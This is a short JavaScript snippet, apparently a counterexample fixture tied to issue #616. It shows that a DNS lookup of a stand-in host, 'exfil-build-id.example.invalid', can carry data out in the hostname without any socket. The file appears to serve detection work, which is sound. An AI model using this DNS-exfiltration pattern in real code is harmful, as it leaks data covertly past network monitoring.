// Counterexample from #616: a DNS query carries data in the name, with no socket in sight.
import dns from 'node:dns';

dns.lookup('exfil-build-id.example.invalid', () => {});
